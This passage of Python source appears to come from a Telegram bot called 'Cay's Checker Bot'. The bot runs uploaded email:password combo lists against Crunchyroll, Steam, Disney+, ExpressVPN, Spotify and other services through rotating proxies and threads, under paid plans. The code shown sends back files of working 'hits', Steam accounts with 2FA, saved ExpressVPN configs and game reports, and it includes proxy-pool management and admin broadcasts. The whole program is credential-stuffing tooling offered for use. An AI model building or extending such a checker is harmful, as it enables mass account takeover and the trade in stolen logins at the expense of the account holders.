    bad_count = completed - hits_count
    current_stats = get_user_stats(user_id)
    user_plan = current_stats.get("plan", "FREE").upper()
    twofa_count_bulk = len([h for h in hits if h.get('twofa')])

    if final_status == "stopped" and completed < total:
            elapsed_sec = int(time.time() - start_time)
            cpm = int((completed / elapsed_sec) * 60) if elapsed_sec > 0 else 0
            percent = int((completed / total) * 100)

            mode_name_stop = stats.get("api_mode", "Crunchyroll")
            if mode_name_stop == "Steam":
                twofa_stop = len([h for h in hits if h.get('twofa')])
                normal_stop = hits_count - twofa_stop
                hit_line_stop = f"✅ <b>Hits:</b> <code>{hits_count}</code> (<code>{normal_stop} Normal + {twofa_stop} 2FA</code>)"
            else:
                hit_line_stop = f"✅ <b>Hits:</b> <code>{hits_count}</code>"

            await progress_msg.edit_text(
                f"📊 <b>Scan Stopped ✅</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📁 File: <code>{document.file_name}</code>\n"
                f"🔢 <b>Processed:</b> <code>{completed}/{total}</code> (<code>{percent}%</code>)\n"
                f"🧵 <b>Threads:</b> <code>{user_threads}</code>\n"
                f"📡 <b>Mode:</b> <code>{get_mode_display(stats.get('api_mode'))}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"{hit_line_stop}\n"
                f"❌ <b>Bad:</b> <code>{bad_count}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⏱ <b>Elapsed:</b> <code>{elapsed_sec//60:02d}m {elapsed_sec%60:02d}s</code>\n"
                f"⚡ <b>CPM:</b> <code>{cpm}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode='HTML'
            )
            await manage_result_pin(update, context, progress_msg.message_id)
    else:   
        # ====================== IMPROVED SUMMARY WITH 2FA BREAKDOWN ======================
        elapsed = int(time.time() - start_time)
        cpm = int((total / elapsed) * 60) if elapsed > 0 else 0

        mode_name = stats.get("api_mode", "Crunchyroll")
        
        if mode_name == "Steam":
            twofa_count = len([hit for hit in hits if hit.get('twofa')])
            normal_hits = hits_count - twofa_count
            
            hit_line = f"✅ <b>HITS:</b> <code>{hits_count}</code> (<code>{normal_hits} Normal + {twofa_count} 2FA</code>)"
            twofa_line = f"🔐 <b>2FA Required:</b> <code>{twofa_count}</code>\n" if twofa_count > 0 else ""
        else:
            hit_line = f"✅ <b>HITS:</b> <code>{hits_count}</code>"
            twofa_line = ""

        summary = f"""
<b>📊 Scan Completed ✅</b>
━━━━━━━━━━━━━━━━━━━━━━━━
📁 <b>File:</b> <code>{document.file_name}</code>
📊 <b>Processed:</b> <code>{completed}/{total}</code>
🧵 <b>Threads:</b> <code>{user_threads}</code>
📡 <b>Mode:</b> <code>{get_mode_display(stats.get('api_mode'))}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
{hit_line}
{twofa_line}❌ <b>BAD:</b> <code>{bad_count}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
⏱ <b>Elapsed:</b> <code>{elapsed}s</code>
⚡ <b>CPM:</b> <code>{cpm}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
"""
        await progress_msg.edit_text(summary, parse_mode='HTML')
        await manage_result_pin(update, context, progress_msg.message_id)

    update_user_stats(user_id, {
        "total_scans": current_stats["total_scans"] + completed,
        "total_hits": current_stats["total_hits"] + hits_count,
        "total_free": current_stats.get("total_free", 0) + bad_count,
        "total_2fa": current_stats.get("total_2fa", 0) + twofa_count_bulk,
        "today_scans": current_stats["today_scans"] + completed
    })

    # ====================== HITS + BAD + 2FA FILES (mode-aware) ======================
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    mode_name = stats.get("api_mode", "Crunchyroll")
    
    if hits_count > 0:
        hits_text = f"🎉 {mode_name.upper()} HITS - {user_plan} PLAN\n" + "="*70 + "\n\n"
        for hit in hits:
            hits_text += format_hit_for_file(hit, user_plan, mode_name)

        hits_file = f"/tmp/{mode_name.lower()}_hits_{timestamp}.txt"
        with open(hits_file, "w", encoding="utf-8") as f:
            f.write(hits_text)

        fancy_caption = f"""
👍 <b>{hits_count}x {mode_name} Hits</b>
────────────────────────
☰ BY @caydigitals ✅
────────────────────────
<a href="https://t.me/clydecrunchybot">BOT</a> | <a href="https://t.me/caysredirect">Channel</a>
        """.strip()

        await update.message.reply_document(
            document=open(hits_file, "rb"),
            filename=f"{mode_name} Hits @caydigitals.txt",
            caption=fancy_caption,
            parse_mode='HTML'
        )

    if hits_count > 0 and mode_name == "ExpressVPN":
            await update.message.reply_text(
                f"🔑 <b>{hits_count} OVPN config files</b> have been saved in the <code>ovpns/</code> folder.",
                parse_mode='HTML'
            )

    # === Save separate 2FA file for Steam ===
    if mode_name == "Steam":
        twofa_accounts = [hit for hit in hits if hit.get('twofa')]
        if twofa_accounts:
            twofa_text = f"🔐 STEAM 2FA ACCOUNTS - {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
            twofa_text += "="*60 + "\n\n"
            for acc in twofa_accounts:
                twofa_text += f"{acc['email']}:{acc['password']} | SteamID: {acc.get('steamid','N/A')}\n"
            
            twofa_file = f"/tmp/steam_2fa_{timestamp}.txt"
            with open(twofa_file, "w", encoding="utf-8") as f:
                f.write(twofa_text)

            await update.message.reply_document(
                document=open(twofa_file, "rb"),
                filename=f"Steam 2FA @caydigitals.txt",
                caption=f"🔐 {len(twofa_accounts)}x Steam Accounts with 2FA",
                parse_mode='HTML'
            )

    if bad_count > 0:
        hit_emails = {hit['email'] for hit in hits}
        bad_lines = []
        for email, pwd in processed_accounts_list:
            if email in hit_emails:
                continue
            # Find the full result for this account
            full_result = next((r for r in hits + [r for r in processed_accounts_list if isinstance(r, dict)] if r.get('email') == email), None)
            if full_result and full_result.get('message') == "Subscription Cancelled":
                bad_lines.append(format_hit_for_file(full_result, user_plan, mode_name))
            else:
                bad_lines.append(f"{email}:{pwd} | Check_By = @caydigitals")
        
        bad_text = f"❌ BAD ACCOUNTS | {mode_name}\n"
        bad_text += f"{'='*40}\n"
        bad_text += "\n".join(bad_lines)
        
        bad_file = f"/tmp/{mode_name.lower()}_bad_{timestamp}.txt"
        with open(bad_file, "w", encoding="utf-8") as f:
            f.write(bad_text)

        bad_caption = f"""
❌ <b>{bad_count}x Bad Accounts</b>
──────────────────────
☰ BY @caydigitals ✅
──────────────────────
<a href="https://t.me/clydecrunchybot">BOT</a> | <a href="https://t.me/caysredirect">Channels</a>
        """.strip()

        await update.message.reply_document(
            document=open(bad_file, "rb"),
            filename=f"{mode_name} Bad @caydigitals.txt",
            caption=bad_caption,
            parse_mode='HTML'
        )

    # Send ONE combined games file for Steam hits (VIP/YEARLY/OWNER only)
    if mode_name == "Steam" and user_plan in ["VIP", "YEARLY", "OWNER"]:
        hits_with_games = [h for h in hits if h.get('games')]
        if hits_with_games:
            combined_file = create_steam_games_file_bulk(hits, user_plan, timestamp)
            if combined_file:
                combined_games = sum(h.get('total_games_owned', h.get('games_count', 0)) for h in hits_with_games)
                combined_playtime = sum(h.get('total_playtime', 0) for h in hits_with_games)

                await update.message.reply_document(
                    document=open(combined_file, "rb"),
                    filename=f"Steam Games Report @caydigitals.txt",
                    caption=(
                        f"🎮 <b>Full Games Report (Bulk)</b>\n"
                        f"──────────────────────\n"
                        f"✅ Hits with Games: <b>{len(hits_with_games)}</b>\n"
                        f"🎮 Combined Games: <b>{combined_games}</b>\n"
                        f"⏳ Combined Playtime: <b>{combined_playtime:,}h</b>\n"
                        f"──────────────────────\n"
                        f"☰ BY @caydigitals ✅\n"
                        f"<a href='https://t.me/clydecrunchybot'>BOT</a> | "
                        f"<a href='https://t.me/caysredirect'>Channel</a>"
                    ),
                    parse_mode='HTML'
                )

    # Cleanup
    delete_scan(scan_id)
    if 'current_scan' in context.user_data:
        del context.user_data['current_scan']

async def edit_to_main_menu(update_or_query, context):
    context.user_data['in_main_menu'] = True
    """Smart function that works for BOTH callback buttons and normal messages"""
    # ←←← IMPORTANT: Clear waiting state when returning to main menu
    if 'waiting_for_threads' in context.user_data:
        context.user_data['waiting_for_threads'] = False

    # Get user_id from either Update or CallbackQuery
    if hasattr(update_or_query, 'callback_query') and update_or_query.callback_query is not None:
        user_id = update_or_query.callback_query.from_user.id
    elif hasattr(update_or_query, 'from_user') and update_or_query.from_user is not None:
        user_id = update_or_query.from_user.id
    else:
        user_id = update_or_query.effective_user.id

    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)
    
    # File statistics for dashboard
    max_files = limits.get("multi_scan_max_files", 1)
    today_files = stats.get("today_files", 0)

    files_display = format_files_display(today_files, max_files, stats.get("plan", "FREE"))

    keyboard = [
        [
            InlineKeyboardButton("📊 My Stats", callback_data="menu_stats"),
            InlineKeyboardButton("🔗 My Referrals", callback_data="menu_referrals")
        ],
        [
            InlineKeyboardButton("🎁 Rewards & Gifts", callback_data="menu_rewards"),
            InlineKeyboardButton("💎 Membership", callback_data="menu_membership")
        ],
        [
            InlineKeyboardButton("📞 Support", callback_data="menu_support"),
            InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")
        ]
    ]

    if user_id == ADMIN_ID:
        keyboard.append([InlineKeyboardButton("🛠️ Admin Panel", callback_data="open_admin_panel")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome = f"""
<b>𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗖𝗔𝗬'𝗦 • 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧</b>
━━━━━━━━━━━━━━━━━━━━━━━━
{get_proxyless_banner(stats.get("proxy_enabled", False) if user_id != ADMIN_ID else is_global_proxy_enabled(), get_pool_size(user_id))}
📤 <b>Send your combo list (.txt file)</b>
<i>Format: mail:pass (one per line)</i>
━━━━━━━━━━━━━━━━━━━━━━━━
📊<b>Your Dashboard:</b>
🧵 Threads: <code><b>{limits['current_threads']}/{limits['max_threads']}</b></code>
📁 Files Today: <code><b>{files_display}</b></code>
👑 Plan: <code><b>{get_plan_with_emoji(stats.get('plan'))}</b></code>
📅 Days Left: <code><b>{get_days_remaining(stats['expires'])} left</b></code>
📈 Daily Limit: <code><b>{limits['remaining_text']} combos</b></code>
📡 Mode: <code><b>{get_mode_display(stats.get('api_mode'))}</b></code>
━━━━━━━━━━━━━━━━━━━━━━━━
<b>👇 Select an option from the menu below:</b>
"""
    
    if hasattr(update_or_query, 'callback_query') and update_or_query.callback_query is not None:
        query = update_or_query.callback_query
        await query.edit_message_text(welcome, parse_mode='HTML', reply_markup=reply_markup)
    else:
        await update_or_query.message.reply_text(welcome, parse_mode='HTML', reply_markup=reply_markup)

async def manage_result_pin(update: Update, context: CallbackContext, message_id: int):
    """Unpin previous result and pin the new one (keeps only latest result pinned)"""
    chat_id = update.effective_chat.id
    
    # Unpin old result if exists (prevents chat clutter)
    old_id = context.user_data.get('last_pinned_result_id')
    if old_id:
        try:
            await context.bot.unpin_chat_message(chat_id=chat_id, message_id=old_id)
        except:
            pass  # already deleted or error
    
    # Pin the new result
    try:
        await context.bot.pin_chat_message(
            chat_id=chat_id,
            message_id=message_id,
            disable_notification=True
        )
        context.user_data['last_pinned_result_id'] = message_id
    except Exception as e:
        print(f"⚠️ Failed to pin result: {e}")

async def show_proxy_manager(query, context):
    """Per-user Proxy Manager — BASIC+ only"""
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    plan = stats.get("plan", "FREE").upper()

    pool_size = get_pool_size(user_id)
    user_uploaded = is_user_uploaded_pool(user_id)
    type_summary = get_proxy_type_summary(user_id)

    if user_id == ADMIN_ID:
        proxy_enabled = is_global_proxy_enabled()
        toggle_callback = "toggle_global_proxy"
        scope_text = "Admin Global Toggle"
    else:
        proxy_enabled = stats.get("proxy_enabled", False)
        toggle_callback = "toggle_user_proxy"
        scope_text = "Your Personal Toggle"

    pool_source = "📤 Uploaded" if user_uploaded else "⚠️ No proxies loaded"

    if pool_size == 0:
        pool_status = "⚠️ Empty"
    elif pool_size < 5:
        pool_status = f"⚠️ Low ({pool_size} proxies)"
    else:
        pool_status = f"✅ Healthy ({pool_size} proxies)"

    if not proxy_enabled:
        toggle_text = "🔄 Proxy: OFF ❌ — Click to Enable"
    elif pool_size == 0:
        toggle_text = "🔄 Proxy: ON ⚠️ (No live proxies)"
    elif pool_size < 5:
        toggle_text = f"🔄 Proxy: ON ⚠️ (Only {pool_size} proxies)"
    else:
        toggle_text = f"🔄 Proxy: ON ✅ ({pool_size} proxies)"

    text = f"""
🌐 <b>Proxy Manager</b>
━━━━━━━━━━━━━━━━━━━━━━━━
🔄 <b>Proxy:</b> <code>{'ON ✅' if proxy_enabled else 'OFF ❌'}</code>
📊 <b>Scope:</b> <code>{scope_text}</code>
🌐 <b>Live Proxies:</b> <code>{pool_size}</code>
📊 <b>Types:</b> <code>{type_summary}</code>
📦 <b>Source:</b> <code>{pool_source}</code>
📊 <b>Pool Status:</b> <code>{pool_status}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
✅ <b>Supported Modes:</b>
<code>- 🏰 Disney+</code>
<code>- 📚 Webtoon</code>
<code>- 🍥 Crunchyroll</code>
<code>- 📺 Vivamax</code>
━━━━━━━━━━━━━━━━━━━━━━━━
⚡ <b>How it works:</b>
- Toggle proxy on/off for your account
- Upload your own residential proxy list (.txt)
- Round-robin rotation between live proxies
- Falls back to direct if pool is empty
━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Free proxies are unreliable and may slow checks.</i>
━━━━━━━━━━━━━━━━━━━━━━━━
    """.strip()

    keyboard = [
        [InlineKeyboardButton(toggle_text, callback_data=toggle_callback)],
        [InlineKeyboardButton("📤 Upload Proxy List", callback_data="upload_proxy_file")],
        [InlineKeyboardButton("🔍 Test Proxies", callback_data="test_proxies")],
        [InlineKeyboardButton("🗑️ Clear Proxy Pool", callback_data="clear_proxy_pool")],
        [InlineKeyboardButton("↼ Back to Settings", callback_data="menu_settings")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)

async def button_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    data = query.data

    # Handle verification button
    if data == "verify_join":
        if await check_subscription(update, context):
            await edit_to_main_menu(update, context)
        else:
            # ←←← THIS IS THE FIX
            await query.answer(
                "❌ You haven't joined the channel yet!\n\n"
                "Please join @caysredirect first, then tap Verify again.",
                show_alert=True
            )
            # Do NOT call send_join_channel_message again (prevents the error)
        return

    # Normal check for all other buttons
    if not await check_subscription(update, context):
        await query.answer("❌ You must join @caysredirect first!", show_alert=True)
        await send_join_channel_message(update, context)
        return

    if data == "menu_stats":
            context.user_data['in_main_menu'] = False
            await show_statistics_menu(query, context)

    elif data == "open_admin_panel":
        if query.from_user.id != ADMIN_ID:
            await query.answer("❌ Owner only!", show_alert=True)
            return
        await show_admin_panel(query, context, is_callback=True)

    elif data.startswith("admin_toggle:"):
        if query.from_user.id != ADMIN_ID:
            await query.answer("❌ Owner only!", show_alert=True)
            return
        mode_key = data.split(":", 1)[1]
        new_status = toggle_mode(mode_key)

        icon = MODES[mode_key]["icon"]
        status_text = "✅ ENABLED" if new_status else "🔴 DISABLED"

        # Send status message to admin
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"{icon} <b>{mode_key} Mode is now {status_text}</b>",
            parse_mode='HTML'
        )

        # Only broadcast to users when mode is re-enabled
        if new_status:
            notification = (
                f"🎉 <b>Good News!</b>\n\n"
                f"The <b>{mode_key} Mode</b> is now back online.\n\n"
                f"You can now use it again. ✅"
            )
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text="📢 <b>Broadcasting notification to all users...</b>",
                parse_mode='HTML'
            )
            try:
                users = supabase.table("user_stats").select("user_id").execute()
                sent_count = 0
                for user in users.data:
                    try:
                        await context.bot.send_message(
                            chat_id=user["user_id"],
                            text=notification,
                            parse_mode='HTML'
                        )
                        sent_count += 1
                        await asyncio.sleep(0.35)
                    except:
                        continue

                await context.bot.send_message(
                    chat_id=ADMIN_ID,
                    text=f"✅ <b>Broadcast completed!</b>\nSent to <b>{sent_count}</b> users.",
                    parse_mode='HTML'
                )
            except Exception as e:
                await context.bot.send_message(
                    chat_id=ADMIN_ID,
                    text=f"⚠️ Broadcast failed: {e}",
                    parse_mode='HTML'
                )

        await query.answer(f"{mode_key}: {status_text}", show_alert=False)
        await show_admin_panel(query, context, is_callback=True)

    elif data == "toggle_global_proxy_panel":
        if query.from_user.id != ADMIN_ID:
            await query.answer("❌ Owner only!", show_alert=True)
            return
        new_val = not is_global_proxy_enabled()
        set_global_proxy_enabled(new_val)
        await query.answer(f"🌐 Global Proxy: {'ON ✅' if new_val else 'OFF ❌'}", show_alert=False)
        await show_admin_panel(query, context, is_callback=True)

    elif data == "admin_broadcast":
        if query.from_user.id != ADMIN_ID:
            await query.answer("❌ Owner only!", show_alert=True)
            return
        context.user_data['waiting_for_broadcast'] = True
        await query.edit_message_text(
            "📢 <b>Broadcast Mode</b>\n\nSend the message you want to broadcast to all users.\n\n<i>Send /cancel to abort.</i>",
            parse_mode='HTML'
        )

    elif data == "test_proxies":
        user_id = query.from_user.id
        pool_size = get_pool_size(user_id)

        if pool_size == 0:
            await query.answer("⚠️ No proxies loaded to test!", show_alert=True)
            return

        await query.answer("🔍 Testing proxies...", show_alert=False)

        await query.edit_message_text(
            f"🔍 <b>Testing Proxies...</b>\n\n"
            f"📦 <b>Total:</b> <code>{pool_size}</code> proxies\n"
            f"⏳ Starting...",
            parse_mode='HTML'
        )

        user_stats = get_user_stats(user_id)
        current_mode = user_stats.get("api_mode", "Crunchyroll")
        test_url = {
            "Crunchyroll": "api.crunchyroll.com",
            "Disney+":     "disneyplusbilling.com",
            "Webtoon":     "webtoons.com",
            "Vivamax":     "api.vivamax.ph",
            "Steam":       "steampowered.com",
            "ExpressVPN":  "expressapisv2.net",
            "Spotify":     "accounts.spotify.com",
        }.get(current_mode, "google.com")

        # ── Live progress tracking (thread-safe counter updated by worker threads) ──
        import threading as _threading
        _prog = {"checked": 0, "alive": 0}
        _prog_lock = _threading.Lock()

        def _on_progress(checked: int, total_cnt: int, is_alive: bool):
            with _prog_lock:
                _prog["checked"] = checked
                if is_alive:
                    _prog["alive"] += 1

        # ── Background task: edit Telegram message every 2 seconds ──
        async def _live_updater():
            while True:
                await asyncio.sleep(2)
                with _prog_lock:
                    checked  = _prog["checked"]
                    alive_cnt = _prog["alive"]
                dead_cnt = checked - alive_cnt
                percent  = int((checked / pool_size) * 100) if pool_size else 100
                bar_filled = min(20, int(percent / 5))
                bar = "█" * bar_filled + "░" * (20 - bar_filled)
                try:
                    await query.edit_message_text(
                        f"🔍 <b>Testing Proxies...</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"📡 <b>Mode:</b> <code>{current_mode}</code>\n"
                        f"📦 <b>Total:</b> <code>{pool_size}</code>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"🔢 <b>Checked:</b> <code>{checked}/{pool_size}</code>\n"
                        f"[<code>{bar}</code>] <code>{percent}%</code>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"✅ <b>Alive:</b> <code>{alive_cnt}</code>\n"
                        f"❌ <b>Dead:</b> <code>{dead_cnt}</code>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"⏳ <i>Testing in progress...</i>",
                        parse_mode='HTML'
                    )
                except Exception:
                    pass  # Telegram edit rate-limit — skip this tick

        updater_task = asyncio.create_task(_live_updater())

        try:
            loop = asyncio.get_running_loop()
            results = await loop.run_in_executor(
                None,
                lambda: test_all_proxies(user_id, current_mode, progress_callback=_on_progress),
            )
        finally:
            updater_task.cancel()
            try:
                await updater_task
            except asyncio.CancelledError:
                pass

        alive = results["alive"]
        dead = results["dead"]

        # Store dead list so the "Remove Dead" button can use it
        context.user_data['dead_proxies'] = dead

        keyboard = []
        if dead:
            keyboard.append([InlineKeyboardButton(
                f"🗑️ Remove {len(dead)} Dead Proxies", callback_data="remove_dead_proxies"
            )])
        keyboard.append([InlineKeyboardButton("↼ Back to Proxy Manager", callback_data="proxy_manager")])

        await query.edit_message_text(
            f"🔍 <b>Proxy Test Complete</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📡 <b>Tested against:</b> <code>{current_mode}</code>\n"
            f"🌐 <b>Endpoint:</b> <code>{test_url}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 <b>Total Tested:</b> <code>{pool_size}</code>\n"
            f"✅ <b>Alive:</b> <code>{len(alive)}</code>\n"
            f"❌ <b>Dead:</b> <code>{len(dead)}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{'🟢 All proxies work for ' + current_mode + '!' if not dead else f'⚠️ {len(dead)} proxies failed on ' + current_mode + '.'}",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    elif data == "remove_dead_proxies":
        user_id = query.from_user.id
        dead = context.user_data.get('dead_proxies', [])

        if not dead:
            await query.answer("✅ No dead proxies to remove!", show_alert=True)
            await show_proxy_manager(query, context)
            return

        new_size = remove_dead_proxies(user_id, dead)
        context.user_data.pop('dead_proxies', None)

        await query.answer(f"🗑️ Removed {len(dead)} dead proxies!", show_alert=False)
        await query.edit_message_text(
            f"✅ <b>Dead Proxies Removed</b>\n\n"
            f"🗑️ <b>Removed:</b> <code>{len(dead)}</code> dead proxies\n"
            f"✅ <b>Remaining:</b> <code>{new_size}</code> live proxies",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("↼ Back to Proxy Manager", callback_data="proxy_manager")]
            ])
        )

    elif data == "clear_proxy_pool":
        user_id = query.from_user.id
        clear_proxy_pool(user_id)
        await query.answer("🗑️ Proxy pool cleared!", show_alert=True)
        await show_proxy_manager(query, context)

    elif data == "menu_referrals":
        context.user_data['in_main_menu'] = False
        await show_referrals_menu(query, context)

    elif data == "proxy_manager":
            await show_proxy_manager(query, context)

    elif data == "toggle_global_proxy":
        new_val = not is_global_proxy_enabled()
        set_global_proxy_enabled(new_val)
        status = "ON ✅" if new_val else "OFF ❌"
        await query.answer(f"🌐 Global Proxy: {status}", show_alert=False)
        await show_proxy_manager(query, context)

    elif data == "upload_proxy_file":
        context.user_data['waiting_for_proxy_file'] = True
        await query.edit_message_text(
            "📤 <b>Upload Proxy List</b>\n\n"
            "Send a <b>.txt file</b> with one proxy per line.\n\n"
            "Supported formats:\n"
            "<code>ip:port</code>\n"
            "<code>user:pass@ip:port</code>\n"
            "<code>http://ip:port</code>\n"
            "<code>socks4://ip:port</code>\n"
            "<code>socks5://user:pass@ip:port</code>",
            parse_mode='HTML'
        )

    elif data == "toggle_user_proxy":
        user_id = query.from_user.id
        stats = get_user_stats(user_id)
        current = stats.get("proxy_enabled", False)
        new_val = not current
        update_user_stats(user_id, {"proxy_enabled": new_val})
        status = "ON ✅" if new_val else "OFF ❌"
        await query.answer(f"🌐 Proxy: {status}", show_alert=False)
        await show_proxy_manager(query, context)

    elif data == "menu_rewards":
        context.user_data['in_main_menu'] = False
        await show_rewards_menu(query, context)

    elif data == "claim_daily_reward":
        await claim_daily_reward(query, context)

    elif data == "redeem_gift_code":
        await query.answer("📦 Gift code redemption coming soon!", show_alert=True)
        await show_rewards_menu(query, context)
    
    elif data == "menu_membership":
        context.user_data['in_main_menu'] = False
        await show_membership_menu(query, context)
    
    elif data == "menu_settings":
        context.user_data['in_main_menu'] = False
        await show_settings_menu(query, context)
    
    elif data == "set_threads":
        context.user_data['in_main_menu'] = False
        await handle_set_threads(query, context)
    
    elif data == "set_api_mode":
        context.user_data['in_main_menu'] = False
        await show_api_mode_menu(query, context)

    elif data.startswith("pause_scan:") or data.startswith("resume_scan:"):
        scan_id = data.split(":", 1)[1]
        current_status = get_scan_status(scan_id)
        new_status = "running" if current_status == "paused" else "paused"
        
        # ← Answer FIRST before anything else
        await query.answer(
            "⏸️ Paused" if new_status == "paused" else "▶️ Resumed",
            show_alert=False
        )
        
        set_scan_status(scan_id, new_status)  # now instant, no network

        progress_msg = context.user_data.get('current_scan', {}).get('progress_msg')
        last = context.user_data.get('current_scan', {}).get('last_progress', {})

        if not progress_msg or not last:
            return

        if new_status == "paused":
            status_title = "📊 <b>Scan Paused</b> ⏸️"
            keyboard = [[
                InlineKeyboardButton("▶️ Resume", callback_data=f"resume_scan:{scan_id}"),
                InlineKeyboardButton("⏹️ Stop", callback_data=f"stop_scan:{scan_id}")
            ]]
        else:
            status_title = "📊 <b>Scan In Progress</b> 🔄"
            keyboard = [[
                InlineKeyboardButton("⏸️ Pause", callback_data=f"pause_scan:{scan_id}"),
                InlineKeyboardButton("⏹️ Stop", callback_data=f"stop_scan:{scan_id}")
            ]]

        try:
            await progress_msg.edit_text(
                f"{status_title}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📁 File: <code>{last.get('file_name','')}</code>\n"
                f"🔢 <b>Processed:</b> <code>{last.get('completed',0)}/{last.get('total',0)}</code> (<code>{last.get('percent',0)}%</code>)\n"
                f"🧵 <b>Threads:</b> <code>{last.get('threads',0)}</code>\n"
                f"📡 <b>Mode:</b> <code>{last.get('mode','')}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>Hits:</b> <code>{last.get('hits',0)}</code>\n"
                f"❌ Bad: <code>{last.get('bad',0)}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⏱ <b>Elapsed:</b> <code>{last.get('elapsed_sec',0)//60:02d}m {last.get('elapsed_sec',0)%60:02d}s</code>\n"
                f"⚡ <b>CPM:</b> <code>{last.get('cpm',0)}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"— Controls:\n"
                f"Pause\n"
                f"Resume\n"
                f"Stop and send results\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except:
            pass  # edit failed due to rate limit, flag is already set
        return

    elif data.startswith("stop_scan:"):
        scan_id = data.split(":", 1)[1]
        set_scan_status(scan_id, "stopped")
        await query.answer("⏹️ Stopping scan...", show_alert=True)
        return

    elif data.startswith("set_mode:"):
        new_mode = data.split(":", 1)[1]

        if not is_mode_enabled(new_mode) and query.from_user.id != ADMIN_ID:
            await query.answer(f"🔴 {new_mode} Mode is currently offline!", show_alert=True)
            return

        user_id = query.from_user.id
        
        # === VIP-ONLY PROTECTION FOR VIVAMAX ===
        if new_mode == "Vivamax" and user_id != ADMIN_ID:
            stats = get_user_stats(user_id)
            user_plan = stats.get("plan", "FREE").upper()
            
            if user_plan not in ["VIP", "YEARLY"]:
                await query.answer("", show_alert=False)
                await context.bot.send_message(
                    chat_id=query.message.chat_id,
                    text=(
                        "🔒 <b>Vivamax Mode</b> is restricted to <b>VIP</b> members only!\n\n"
                        "<a href='https://t.me/caydigitals'>@caydigitals</a>"
                    ),
                    parse_mode='HTML',
                    disable_web_page_preview=False
                )
                return

        stats = get_user_stats(user_id)
        current_mode = stats.get("api_mode", "Crunchyroll")

        if new_mode == current_mode:
            await query.answer("ℹ️ Already in this mode", show_alert=False)
            return

        update_user_stats(user_id, {"api_mode": new_mode})
        await query.answer(f"✅ Switched to {new_mode} Mode!", show_alert=False)
        await show_api_mode_menu(query, context)
    
    elif data == "back_to_main":
        await edit_to_main_menu(update, context)
    
    elif data == "menu_support":
        context.user_data['in_main_menu'] = False
        await show_support_menu(query, context)
    
    else:
        text = "Unknown option"
        await query.edit_message_text(text, parse_mode='HTML')

# Register handlers
tg_app.add_handler(CommandHandler("start", start))
tg_app.add_error_handler(error_handler)
tg_app.add_handler(CommandHandler("cancel", cancel_command))
tg_app.add_handler(CommandHandler("setplan", set_plan_command))
tg_app.add_handler(CommandHandler("resetreward", reset_reward_command))
tg_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
tg_app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
tg_app.add_handler(CallbackQueryHandler(button_callback))

# ============== WEBHOOK ENDPOINT ==============
@app.post("/webhook")
async def webhook(request: Request):
    try:
        data = await request.json()
        update = Update.de_json(data, tg_app.bot)
        
        # Process update safely
        await tg_app.process_update(update)
        return {"status": "ok"}
    
    except Exception as e:
        print(f"❌ Webhook error: {e}")
        # Still return 200 so Telegram stops retrying
        return {"status": "error"}

@app.get("/")
async def root():
    return {
        "status": "✅ Bot is Running",
        "bot": "Cay's Checker Bot",
        "webhook": "/webhook"
    }

# Optional: Health check
@app.get("/webhook")
async def webhook_get():
    return {
        "status": "✅ Webhook is Active",
        "info": "Telegram uses POST requests only. This is normal."
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))